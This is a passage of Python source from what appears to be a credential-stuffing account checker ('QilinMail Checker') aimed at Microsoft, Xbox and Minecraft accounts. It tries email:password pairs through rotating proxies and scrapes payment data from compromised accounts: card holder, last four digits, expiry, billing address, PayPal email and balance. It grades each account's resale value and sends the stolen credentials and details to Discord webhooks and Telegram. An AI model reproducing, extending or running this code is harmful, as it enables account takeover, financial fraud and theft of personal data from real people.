        # ── UI sayaçlarını güncelle ─────────────────────────
        try:
            if UI_ENABLED and ui:
                _tier = getattr(self, 'value_tier', 'C') or 'C'
                _tk = f'tier_{_tier.lower()}'
                if _tk in ui.stats: ui.stats[_tk] += 1
                if getattr(self,'slothpixel_info',None) or getattr(self,'hypixel_guild',None): ui.stats['hypixel'] = ui.stats.get('hypixel',0)+1
                if getattr(self,'lunar_stats',None): ui.stats['lunar'] = ui.stats.get('lunar',0)+1
                if getattr(self,'cubecraft_info',None): ui.stats['cubecraft'] = ui.stats.get('cubecraft',0)+1
                if getattr(self,'zeqa_info',None): ui.stats['zeqa'] = ui.stats.get('zeqa',0)+1
                if any(getattr(self,x,None) for x in ('capes_dev','cosmetica_info','quasar_cape','mccapes_info','feather_info','tlauncher_cape','fivezig_cape','optifine_cape')): ui.stats['capes_total'] = ui.stats.get('capes_total',0)+1
                if getattr(self,'ms_balance',None) and self.ms_balance not in ('0.00 USD','None','',None,'0 USD'): ui.stats['payment_methods'] = ui.stats.get('payment_methods',0)+1
                if getattr(self,'og_name',None) and self.og_name not in (None,'N/A','',False): ui.stats['og_names'] = ui.stats.get('og_names',0)+1
                if getattr(self,'bedrock_info',None): ui.stats['bedrock'] = ui.stats.get('bedrock',0)+1
                if getattr(self,'essential_info',None): ui.stats.setdefault('essential',0); ui.stats['essential'] = ui.stats.get('essential',0)+1
                if getattr(self,'breach_info',None): ui.stats.setdefault('breach',0); ui.stats['breach'] = ui.stats.get('breach',0)+1
                if getattr(self,'realms_info',None): ui.stats.setdefault('realms',0); ui.stats['realms'] = ui.stats.get('realms',0)+1
                if getattr(self,'name_rarity',None) and 'Rare' in str(self.name_rarity): ui.stats.setdefault('rare_names',0); ui.stats['rare_names'] = ui.stats.get('rare_names',0)+1
                if getattr(self,'minemen_info',None): ui.stats.setdefault('minemen',0); ui.stats['minemen'] = ui.stats.get('minemen',0)+1
                if getattr(self,'hive_info',None): ui.stats.setdefault('hive',0); ui.stats['hive'] = ui.stats.get('hive',0)+1
                if getattr(self,'wynncraft_info',None): ui.stats.setdefault('wynncraft',0); ui.stats['wynncraft'] = ui.stats.get('wynncraft',0)+1
        except: pass
        try:
            ensure_results_dirs(fname)
            with file_lock:
                open(f'results/{fname}/Capture.txt','a',encoding='utf-8').write(fullcapt+'\n')
        except:
            pass
        try:
            # Hypixel klasörüne de doğrudan yaz
            if getattr(self, 'slothpixel_info', None) or getattr(self,'bwstars',None):
                ensure_results_dirs(fname)
                with file_lock:
                    open(f'results/{fname}/Hypixel/Hits.txt','a',encoding='utf-8').write(
                        f'{self.email}:{self.password} | {getattr(self,"slothpixel_info","")}\n')
        except:
            pass
        try:
            smart_save(fname, self, fullcapt+'\n')
        except: pass
        try:
            _tk = f'tier_{str(self.value_tier).lower()}'
            if UI_ENABLED and ui:
                with stats_lock:
                    ui.stats[_tk] = ui.stats.get(_tk, 0) + 1
                    if getattr(self, 'og_name', None):
                        ui.stats['og_names'] = ui.stats.get('og_names', 0) + 1
                    if getattr(self, 'cubecraft_stats', None):
                        ui.stats['cubecraft'] = ui.stats.get('cubecraft', 0) + 1
                    if getattr(self, 'lunar_stats', None):
                        ui.stats['lunar'] = ui.stats.get('lunar', 0) + 1
        except: pass
        try: send_telegram_hit(self)
        except: pass
        try:
            if UI_ENABLED and ui:
                ui.record_hit_time()
                ui.log_hit_colored_tier(masked_capt, self.value_tier)
                if getattr(self, 'og_name', None):
                    ui.og_alert(self.name or 'Unknown', self.og_name)
                if ui.stats.get('hits', 0) % 5 == 0:
                    ui.print_live_stats_table()
                if ui.stats.get('hits', 0) % 10 == 0:
                    ui.print_hit_rate_graph()
        except: pass
        if UI_ENABLED and ui:
            ui.log_hit_formatted(self, stats_text, precomputed_line=masked_capt)
        self.send_discord_webhook()
    def send_discord_webhook(self):
        try:
            enable_notifications = config.get('enable_notifications')
            if enable_notifications is False or str(enable_notifications).lower() == 'false':
                return
            webhook_url = config.get('discord_webhook_url', '')
            if not webhook_url or webhook_url.strip() == '':
                if UI_ENABLED and ui:
                    ui.log_error('[Webhook] No webhook URL configured')
                return
            # ── Multi-channel routing
            _t_up  = str(getattr(self,'type','') or '').upper()
            _tier  = getattr(self,'value_tier','C')
            _og    = getattr(self,'og_name',None)
            _extra_hooks = []
            _xgpu_hook   = config.get('webhook_url_xgpu','')
            _tier_s_hook = config.get('webhook_url_tier_s','')
            _og_hook     = config.get('webhook_url_og','')
            if ('ULTIMATE' in _t_up or 'XGPU' in _t_up) and _xgpu_hook:
                _extra_hooks.append(_xgpu_hook)
            if _tier == 'S' and _tier_s_hook:
                _extra_hooks.append(_tier_s_hook)
            if _og and _og_hook:
                _extra_hooks.append(_og_hook)
            embed_color = config.get('embed_color_hit', 5763719)
            notification_type = 'Account Hit'
            if 'Xbox Game Pass Ultimate' in str(self.type):
                embed_color = config.get('embed_color_xgp', 3447003)
                notification_type = 'Xbox Game Pass Ultimate'
            elif 'Xbox Game Pass' in str(self.type):
                embed_color = config.get('embed_color_xgp', 3447003)
                notification_type = 'Xbox Game Pass (PC)'
            elif 'Normal Minecraft' in str(self.type):
                embed_color = config.get('embed_color_hit', 5763719)
                notification_type = 'Minecraft Account'
            fields = []
            _score=getattr(self,'value_score',0); _tier=getattr(self,'value_tier','C')
            _tico={'S':'💎','A':'🔥','B':'⚡','C':'·'}.get(_tier,'·')
            fields.append({'name':f'{_tico} ᴛɪᴇʀ / sᴄᴏʀᴇ','value':f'`{_tier}-Tier | Score:{_score}`','inline':False})
            fields.append({'name': '📧 ᴇᴍᴀɪʟ', 'value': f'`{self.email}`', 'inline': False})
            fields.append({'name': '🔑 ᴘᴀssᴡᴏʀᴅ', 'value': f'`{self.password}`', 'inline': False})
            if self.hypixl and self.hypixl != 'N/A':
                fields.append({'name': ' ᴜsᴇʀɴᴀᴍᴇ', 'value': f'`{self.hypixl}`', 'inline': True})
            elif self.name and self.name != 'N/A':
                fields.append({'name': ' ᴜsᴇʀɴᴀᴍᴇ', 'value': f'`{self.name}`', 'inline': True})
            if self.type:
                fields.append({'name': ' ᴛʏᴘᴇ', 'value': str(self.type), 'inline': True})
            if self.capes and self.capes != '':
                fields.append({'name': ' ᴄᴀᴘᴇs', 'value': str(self.capes), 'inline': True})
            if self.level:
                fields.append({'name': ' ʜʏᴘɪxᴇʟ ʟᴇᴠᴇʟ', 'value': str(self.level), 'inline': True})
            if self.bwstars and int(self.bwstars) > 0:
                fields.append({'name': ' ʙᴇᴅᴡᴀʀ sᴛᴀʀs', 'value': str(self.bwstars), 'inline': True})
            if self.sbcoins:
                fields.append({'name': ' sᴋʏʙʟᴏᴄᴋ ᴄᴏɪɴs', 'value': str(self.sbcoins), 'inline': True})
            fields.append({'name': ' ᴏᴘᴛɪғɪɴᴇ ᴄᴀᴘᴇ', 'value': ' Yes' if self.cape and self.cape == 'Yes' else ' No', 'inline': True})
            if self.namechanged and self.namechanged == 'True':
                fields.append({'name': ' ɴᴀᴍᴇᴄʜᴀɴɢᴇᴀʙʟᴇ', 'value': ' Yes', 'inline': True})
            elif self.namechanged is not None:
                fields.append({'name': ' ɴᴀᴍᴇᴄʜᴀɴɢᴇᴀʙʟᴇ', 'value': ' No', 'inline': True})
            if self.banned and self.banned != 'False':
                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': f'🚫 {self.banned}', 'inline': True})
            elif self.banned == 'False':
                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': '✅ Not Banned', 'inline': True})
            else:
                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': '❓ Unknown', 'inline': True})
            if self.access:
                access_emoji='✅' if self.access=='True' else '❌'
                fields.append({'name':' ᴇᴍᴀɪʟ ᴀᴄᴄᴇss','value':f'{access_emoji} {self.access}','inline':True})
            _cc=getattr(self,'cubecraft_stats',None)
            if _cc: fields.append({'name':'🟦 ᴄᴜʙᴇᴄʀᴀꜰᴛ','value':f'`{_cc}`','inline':False})
            _ln=getattr(self,'lunar_stats',None)
            if _ln: fields.append({'name':'🌙 ʟᴜɴᴀʀ','value':f'`{_ln}`','inline':False})
            _re=getattr(self,'ms_recovery_email',None)
            if _re: fields.append({'name':'📬 ʀᴇᴄᴏᴠᴇʀʏ','value':f'`{_re}`','inline':True})
            _ph=getattr(self,'ms_phone_hint',None)
            if _ph: fields.append({'name':'📱 ᴘʜᴏɴᴇ','value':f'`{_ph}`','inline':True})
            _og=getattr(self,'og_name',None)
            if _og: fields.append({'name':'🏆 ᴏɢ ɴᴀᴍᴇ','value':f'`{_og}`','inline':True})
            _age2=getattr(self,'account_age',None)
            if _age2: fields.append({'name':'📅 ᴀᴄᴄ ᴀɢᴇ','value':f'`{_age2}`','inline':True})
            _2fat=getattr(self,'twofa_type',None)
            if _2fat: fields.append({'name':'🔒 2ꜰᴀ ᴛʏᴘᴇ','value':f'`{_2fat}`','inline':True})
            _exp2=getattr(self,'sub_expiry',None)
            if _exp2: fields.append({'name':'📆 sᴜʙ ᴇxᴘɪʀʏ','value':f'`{_exp2}`','inline':True})
            _xtag2=getattr(self,'xbox_gamertag',None)
            if _xtag2 and _xtag2!=self.name: fields.append({'name':'🎮 xʙᴏx ᴛᴀɢ','value':f'`{_xtag2}`','inline':True})
            _gcb2=getattr(self,'gift_card_bal',None)
            if _gcb2: fields.append({'name':'🎁 ɢɪꜰᴛ ᴄᴀʀᴅ','value':f'`{_gcb2}`','inline':True})
            _sk2=getattr(self,'skin_info',None)
            if _sk2 and 'Custom' in str(_sk2): fields.append({'name':'🦸 sᴋɪɴ','value':f'`{_sk2}`','inline':True})
            _cv2=getattr(self,'cape_value_str',None)
            if _cv2: fields.append({'name':'🧣 ᴄᴀᴘᴇ','value':f'`{_cv2}`','inline':True})
            _gi2=getattr(self,'guild_info',None)
            if _gi2: fields.append({'name':'⚔ ɢᴜɪʟᴅ','value':f'`{_gi2[:50]}`','inline':True})
            _swp2=getattr(self,'sw_prestige',None)
            if _swp2: fields.append({'name':'🏆 sᴡ ᴘʀᴇsᴛɪɢᴇ','value':f'`{_swp2}`','inline':True})
            _mmk2=getattr(self,'mm_kills',None)
            _mmw2=getattr(self,'mm_wins',None)
            if _mmk2 or _mmw2: fields.append({'name':'🔪 ᴍᴜʀᴅᴇʀ','value':f'`{_mmk2}K / {_mmw2}W`','inline':True})
            _bbs2=getattr(self,'bb_score',None)
            if _bbs2: fields.append({'name':'🏗 ʙᴜɪʟᴅ','value':f'`{_bbs2}`','inline':True})
            _bdi2=getattr(self,'bedrock_info',None)
            if _bdi2 and isinstance(_bdi2,dict): fields.append({'name':'📱 ʙᴇᴅʀᴏᴄᴋ','value':f"`{_bdi2.get('gamertag','')}`",'inline':True})
            _cdv=getattr(self,'capes_dev',None)
            if _cdv: fields.append({'name':'🧣 ᴄᴀᴘᴇs','value':f'`{_cdv[:60]}`','inline':True})
            _laby=getattr(self,'labymod_info',None)
            if _laby: fields.append({'name':'💎 ʟᴀʙʏᴍᴏᴅ','value':f'`{_laby[:60]}`','inline':True})
            _bdl=getattr(self,'badlion_info',None)
            if _bdl: fields.append({'name':'🎯 ʙᴀᴅʟɪᴏɴ','value':f'`{_bdl[:60]}`','inline':True})
            _wyc=getattr(self,'wynncraft_info',None)
            if _wyc: fields.append({'name':'🏰 ᴡʏɴɴ','value':f'`{_wyc[:60]}`','inline':True})
            _hv=getattr(self,'hive_info',None)
            if _hv: fields.append({'name':'🐝 ʜɪᴠᴇ','value':f'`{_hv[:60]}`','inline':True})
            _pk=getattr(self,'pika_info',None)
            if _pk: fields.append({'name':'💡 ᴘɪᴋᴀ','value':f'`{_pk[:60]}`','inline':True})
            _mmn=getattr(self,'minemen_info',None)
            if _mmn: fields.append({'name':'🥊 ᴍɪɴᴇᴍᴇɴ','value':f'`{_mmn[:60]}`','inline':True})
            _ghub=getattr(self,'github_info',None)
            if _ghub: fields.append({'name':'💻 ɢɪᴛʜᴜʙ','value':f'`{_ghub[:60]}`','inline':True})
            _cosm=getattr(self,'cosmetica_info',None)
            if _cosm: fields.append({'name':'🌈 ᴄᴏsᴍᴇᴛɪᴄᴀ','value':f'`{_cosm[:60]}`','inline':True})
            _ess=getattr(self,'essential_info',None)
            if _ess: fields.append({'name':'✨ ᴇssᴇɴᴛɪᴀʟ','value':f'`{_ess[:60]}`','inline':True})
            _fth=getattr(self,'feather_info',None)
            if _fth: fields.append({'name':'🕊️ ꜰᴇᴀᴛʜᴇʀ','value':f'`{_fth[:60]}`','inline':True})
            _rlm=getattr(self,'realms_info',None)
            if _rlm: fields.append({'name':'🌍 ʀᴇᴀʟᴍs','value':f'`{_rlm[:60]}`','inline':True})
            _nh=getattr(self,'name_history',None)
            if _nh: fields.append({'name':'📜 ɴᴀᴍᴇ ʜɪsᴛ.','value':f'`{str(_nh)[:60]}`','inline':True})
            _snv=getattr(self,'short_name_value',None)
            if _snv: fields.append({'name':'💰 ɴᴀᴍᴇ $','value':f'`{_snv[:60]}`','inline':True})
            _brc=getattr(self,'breach_info',None)
            if _brc: fields.append({'name':'🚨 ʙʀᴇᴀᴄʜ','value':f'`{_brc[:60]}`','inline':True})
            _zqa=getattr(self,'zeqa_info',None)
            if _zqa: fields.append({'name':'⚔️ ᴢᴇQᴀ','value':f'`{_zqa[:60]}`','inline':True})
            _qsr=getattr(self,'quasar_cape',None)
            if _qsr: fields.append({'name':'💫 QᴜᴀsᴀR','value':'`Cape`','inline':True})
            _slth=getattr(self,'slothpixel_info',None)
            if _slth: fields.append({'name':'📊 sʟᴏᴛʜᴘɪx','value':f'`{_slth[:60]}`','inline':True})
            _nmf2=getattr(self,'namemc_favs',None)
            if _nmf2: fields.append({'name':'❤ ɴᴀᴍᴇᴍᴄ ꜰᴀᴠ','value':f'`{_nmf2}`','inline':True})
            _ppb2=getattr(self,'paypal_bal',None)
            if _ppb2: fields.append({'name':'💵 ᴘᴀʏᴘᴀʟ','value':f'`{_ppb2}`','inline':True})
            _cct2=getattr(self,'cc_types',None)
            if _cct2: fields.append({'name':'💳 ᴄᴀʀᴅs','value':f"`{', '.join(_cct2[:3])}`",'inline':True})
            _bde2=getattr(self,'billing_detail',None)
            if _bde2: fields.append({'name':'📍 ʙɪʟʟɪɴɢ','value':f'`{_bde2}`','inline':True})
            _asb2=getattr(self,'active_subs',None)
            if _asb2: fields.append({'name':'📦 sᴜʙs','value':f"`{', '.join(_asb2[:3])[:80]}`",'inline':True})
            _la2=getattr(self,'linked_accounts',None)
            if _la2: fields.append({'name':'🔗 ʟɪɴᴋᴇᴅ','value':f"`{', '.join(_la2)}`",'inline':True})
            _ir2=getattr(self,'imap_results',None)
            if _ir2:
                _sc2=_ir2.get('steam_codes',[])
                _kf2=_ir2.get('keywords_found',[])
                if _sc2: fields.append({'name':'📧 sᴛᴇᴀᴍ ᴄᴏᴅᴇs','value':f"`{', '.join(_sc2[:2])}`",'inline':False})
                elif _kf2: fields.append({'name':'📧 ɪᴍᴀᴘ','value':f"`{', '.join(_kf2[:5])}`",'inline':True})
            _crf=getattr(self,'crafatar_url',None)
            _thumb_url = _crf if _crf else config.get('embed_thumbnail_url','')
            embed = {'title': f' {notification_type} ', 'color': embed_color, 'fields': fields, 'timestamp': datetime.utcnow().isoformat()}
            try:
                if config.get('embed_image_enabled', True):
                    uuid_val = getattr(self, 'uuid', None)
                    template = config.get('embed_image_template', 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip')
                    if '{uuid}' in str(template):
                        if uuid_val and str(uuid_val).strip() and (str(uuid_val) != 'N/A'):
                            img_url = str(template).format(uuid=uuid_val)
                        else:
                            img_url = None
                    else:
                        img_url = str(template)
                    if img_url:
                        embed['image'] = {'url': img_url}
            except Exception:
                pass
            try:
                if config.get('embed_thumbnail', True):
                    thumb_url = config.get('embed_thumbnail_url', config.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png'))
                    embed['thumbnail'] = {'url': thumb_url}
            except Exception:
                pass
            try:
                if config.get('embed_footer', True):
                    footer_text = config.get('webhook_username', 'QilinMail Checker')
                    footer_icon = config.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png')
                    embed['footer'] = {'text': footer_text, 'icon_url': footer_icon}
            except Exception:
                pass
            payload = {'username': config.get('webhook_username', 'QilinMail Checker'), 'avatar_url': config.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png'), 'embeds': [embed]}
            response = requests.post(webhook_url, json=payload, timeout=_safe_t(10))
            for _eu in _extra_hooks:
                try:
                    if _eu and _eu.strip() and _eu != webhook_url:
                        requests.post(_eu, json=payload, timeout=_safe_t(10))
                except: pass
            if response.status_code == 204:
                pass
            elif response.status_code == 429:
                if UI_ENABLED and ui:
                    ui.log_error(f'⚠ Webhook rate limited - wait and retry')
            elif response.status_code == 400:
                if UI_ENABLED and ui:
                    ui.log_error(f'✗ Webhook bad request: {response.text[:200]}')
            elif response.status_code == 404:
                if UI_ENABLED and ui:
                    ui.log_error(f'✗ Webhook URL not found - check config.ini')
            elif UI_ENABLED and ui:
                ui.log_error(f'✗ Webhook failed: {response.status_code} - {response.text[:100]}')
        except requests.exceptions.Timeout:
            if UI_ENABLED and ui:
                ui.log_error('[Webhook] Request timeout - Discord may be slow')
        except requests.exceptions.ConnectionError:
            if UI_ENABLED and ui:
                ui.log_error('[Webhook] Connection error - check internet')
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'[Webhook] Error: {type(e).__name__}: {str(e)[:100]}')
def get_urlPost_sFTTag(session):
    global retries
    attempts = 0
    _max = min(maxretries, 3)
    _timeout = min(int(config.get('timeout', 10)), 8)
    _ua_list = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Edg/119.0.0.0',
    ]
    while attempts < _max:
        try:
            headers = {
                'User-Agent': _ua_list[attempts % len(_ua_list)],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'close',
            }
            resp = session.get(sFTTag_url, headers=headers,
                timeout=(_timeout, _timeout), allow_redirects=True)
            text = resp.text
            match = RE_SFTTAG_VALUE.search(text)
            if match:
                sFTTag = next((g for g in match.groups() if g is not None), None)
                if sFTTag:
                    match_url = RE_URLPOST_VALUE.search(text)
                    if match_url:
                        urlPost = next((g for g in match_url.groups() if g is not None), None)
                        if urlPost:
                            urlPost = urlPost.replace('&amp;', '&')
                            return (urlPost, sFTTag, session)
            if resp.status_code == 429:
                time.sleep(min(2 ** attempts, 8))
        except (requests.exceptions.Timeout, requests.exceptions.ConnectTimeout):
            pass
        except (requests.exceptions.ConnectionError, requests.exceptions.ProxyError):
            pass
        except Exception:
            pass
        _new_proxy = getproxy() if proxylist else None
        if _new_proxy: session.proxies = _new_proxy
        with stats_lock: retries += 1
        attempts += 1
        time.sleep(0.2 * (attempts + 1))
    return (None, None, session)
def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'close'}
            login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=min(int(config.get('timeout', 8)), 8))
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    return (token, session)
            elif 'cancel?mkt=' in login_request.text:
                try:
                    _m_ipt    = RE_IPT.search(login_request.text)
                    _m_pprid  = RE_PPRID.search(login_request.text)
                    _m_uaid   = RE_UAID.search(login_request.text)
                    _m_action = RE_ACTION_FMHF.search(login_request.text)
                    if not all([_m_ipt, _m_pprid, _m_uaid, _m_action]):
                        tries += 1; continue
                    data = {'ipt': _m_ipt.group(), 'pprid': _m_pprid.group(), 'uaid': _m_uaid.group()}
                    action_url = _m_action.group()
                    ret = session.post(action_url, data=data, allow_redirects=True, timeout=min(int(config.get('timeout', 8)), 8))
                    _m_ret = RE_RETURN_URL.search(ret.text)
                    if not _m_ret: tries += 1; continue
                    return_url = _m_ret.group()
                    fin = session.get(return_url, allow_redirects=True, timeout=min(int(config.get('timeout', 8)), 8))
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        return (token, session)
                except Exception:
                    tries += 1; continue
            elif any((value in login_request.text for value in [
                    'account.live.com/recover', 'account.live.com/acsr',
                    'AccountUnlock', 'SuspendedPage', 'login_disallow',
                    'IDENTITY_LOOKUP', 'sSigninNameSuspended',
                    'account has been suspended', 'account is locked',
                    'unusual sign-in activity'])):
                global automarklost
                with stats_lock:
                    automarklost += 1
                with open(f'results/{fname}/Lost.txt', 'a') as _lf:
                    _lf.write(f'{email}:{password}\n')
                return ('Lost', session)
            elif any((value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt='])):
                with open(f'results/{fname}/2fa.txt', 'a') as file:
                    file.write(f'{email}:{password}\n')
                return ('2FA', session)
            elif any((value in login_request.text.lower() for value in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", 'sign in to your microsoft account', "tried to sign in too many times with an incorrect account or password", 'help us protect your account'])):
                return ('None', session)
            else:
                session.proxies = getproxy()
                retries += 1
                tries += 1
                time.sleep(0.1)
        except (requests.exceptions.Timeout, requests.exceptions.ConnectTimeout):
            _npx = getproxy() if proxylist else None
            if _npx: session.proxies = _npx
            with stats_lock: retries += 1
            tries += 1
            time.sleep(0.15)
        except (requests.exceptions.ConnectionError, requests.exceptions.ProxyError):
            _npx = getproxy() if proxylist else None
            if _npx: session.proxies = _npx
            with stats_lock: retries += 1
            tries += 1
            time.sleep(0.15)
        except Exception:
            with stats_lock: retries += 1
            tries += 1
            time.sleep(0.1)
    return ('None', session)
def payment(session, email, password):
    global retries, payment_methods, hits, config
    attempts = 0
    while attempts < maxretries:
        attempts += 1
        try:
            headers = {'Host': 'login.live.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Referer': 'https://account.microsoft.com/'}
            r = session.get('https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none', headers=headers, timeout=int(config.get('timeout', 10)))
            token = parse_qs(urlparse(r.url).fragment).get('access_token', ['None'])[0]
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36', 'Pragma': 'no-cache', 'Accept': 'application/json', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9', 'Authorization': f'MSADELEGATE1.0={token}', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Host': 'paymentinstruments.mp.microsoft.com', 'ms-cV': 'FbMB+cD6byLL1mn4W/NuGH.2', 'Origin': 'https://account.microsoft.com', 'Referer': 'https://account.microsoft.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'Sec-GPC': '1'}
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=int(config.get('timeout', 10)))
            def lr_parse(source, start_delim, end_delim, create_empty=True):
                pattern = re.escape(start_delim) + '(.*?)' + re.escape(end_delim)
                match = re.search(pattern, source)
                if match:
                    return match.group(1)
                return '' if create_empty else None
            date_registered = lr_parse(r.text, '"creationDateTime":"', 'T', create_empty=False)
            fullname = lr_parse(r.text, '"accountHolderName":"', '"', create_empty=False)
            address1 = lr_parse(r.text, '"address":{"address_line1":"', '"')
            card_holder = lr_parse(r.text, 'accountHolderName":"', '","')
            credit_card = lr_parse(r.text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
            expiry_month = lr_parse(r.text, 'expiryMonth":"', '",')
            expiry_year = lr_parse(r.text, 'expiryYear":"', '",')
            last4 = lr_parse(r.text, 'lastFourDigits":"', '",')
            pp = lr_parse(r.text, '":{"paymentMethodType":"paypal","', '}},{"id')
            paypal_email = lr_parse(r.text, 'email":"', '"', create_empty=False)
            balance = lr_parse(r.text, 'balance":', ',"', create_empty=False)
            json_data = json.loads(r.text)
            city = region = zipcode = card_type = cod = ''
            if isinstance(json_data, list):
                for item in json_data:
                    if 'city' in item:
                        city = item['city']
                    if 'region' in item:
                        region = item['region']
                    if 'postal_code' in item:
                        zipcode = item['postal_code']
                    if 'cardType' in item:
                        card_type = item['cardType']
                    if 'country' in item:
                        cod = item['country']
            else:
                city = json_data.get('city', '')
                region = json_data.get('region', '')
                zipcode = json_data.get('postal_code', '')
                card_type = json_data.get('cardType', '')
                cod = json_data.get('country', '')
            user_address = f'[Address: {address1} City: {city} State: {region} Postalcode: {zipcode} Country: {cod}]'
            cc_info = f'[CardHolder: {card_holder} | CC: {credit_card} | CC expiryMonth: {expiry_month} | CC ExpYear: {expiry_year} | CC Last4Digit: {last4} | CC Funding: {card_type}]'
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions', headers=headers)
            ctpid = lr_parse(r.text, '"subscriptionId":"ctp:', '"')
            item1 = lr_parse(r.text, '"title":"', '"')
            auto_renew = lr_parse(r.text, f'"subscriptionId":"ctp:{ctpid}","autoRenew":', ',')
            start_date = lr_parse(r.text, '"startDate":"', 'T')
            next_renewal_date = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            parts = []
            if item1 is not None:
                parts.append(f'Purchased Item: {item1}')
            if auto_renew is not None:
                parts.append(f'Auto Renew: {auto_renew}')
            if start_date is not None:
                parts.append(f'startDate: {start_date}')
            if next_renewal_date is not None:
                parts.append(f'Next Billing: {next_renewal_date}')
            if parts:
                subscription1 = f"[ {' | '.join(parts)} ]"
            else:
                subscription1 = None
            mdrid = lr_parse(r.text, '"subscriptionId":"mdr:', '"')
            auto_renew2 = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":', ',')
            start_date2 = lr_parse(r.text, '"startDate":"', 'T')
            recurring = lr_parse(r.text, 'recurringFrequency":"', '"')
            next_renewal_date2 = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            item_bought = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":{auto_renew2},"startDate":"{start_date2}","recurringFrequency":"{recurring}","nextRenewalDate":"{next_renewal_date2}","title":"', '"')
            parts2 = []
            if item_bought is not None:
                parts2.append(f"Purchased Item's: {item_bought}")
            if auto_renew2 is not None:
                parts2.append(f'Auto Renew: {auto_renew2}')
            if start_date2 is not None:
                parts2.append(f'startDate: {start_date2}')
            if recurring is not None:
                parts2.append(f'Recurring: {recurring}')
            if next_renewal_date2 is not None:
                parts2.append(f'Next Billing: {next_renewal_date2}')
            if parts:
                subscription2 = f"[{' | '.join(parts2)}]"
            else:
                subscription2 = None
            description = lr_parse(r.text, '"description":"', '"')
            product_typee = lr_parse(r.text, '"productType":"', '"')
            product_type_map = {'PASS': 'XBOX GAME PASS', 'GOLD': 'XBOX GOLD'}
            product_type = product_type_map.get(product_typee, product_typee)
            quantity = lr_parse(r.text, 'quantity":', ',')
            currency = lr_parse(r.text, 'currency":"', '"')
            total_amount_value = lr_parse(r.text, 'totalAmount":', '', create_empty=False)
            if total_amount_value is not None:
                total_amount = total_amount_value + f' {currency}'
            else:
                total_amount = f'0 {currency}'
            parts3 = []
            if description is not None:
                parts3.append(f'Product: {description}')
            if product_type is not None:
                parts3.append(f'Product Type: {product_type}')
            if quantity is not None:
                parts3.append(f'Total Purchase: {quantity}')
            if total_amount is not None:
                parts3.append(f'Total Price: {total_amount}')
            if parts:
                subscription3 = f"[ {' | '.join(parts3)} ]"
            else:
                subscription3 = None
            payment = ''
            paymentprint = ''
            has_payment_method = False
            if date_registered:
                payment += f'\nDate Registered: {date_registered}'
                paymentprint += f' | Date Registered: {date_registered}'
            if fullname:
                payment += f'\nFullname: {fullname}'
                paymentprint += f' | Fullname: {fullname}'
            if user_address:
                payment += f'\nUser Address: {user_address}'
                paymentprint += f' | User Address: {user_address}'
            if paypal_email:
                payment += f'\nPaypal Email: {paypal_email}'
                paymentprint += f' | Paypal Email: {paypal_email}'
                has_payment_method = True
            if cc_info and credit_card:
                payment += f'\nCC Info: {cc_info}'
                paymentprint += f' | CC Info: {cc_info}'
                has_payment_method = True
            if balance:
                payment += f'\nBalance: {balance}'
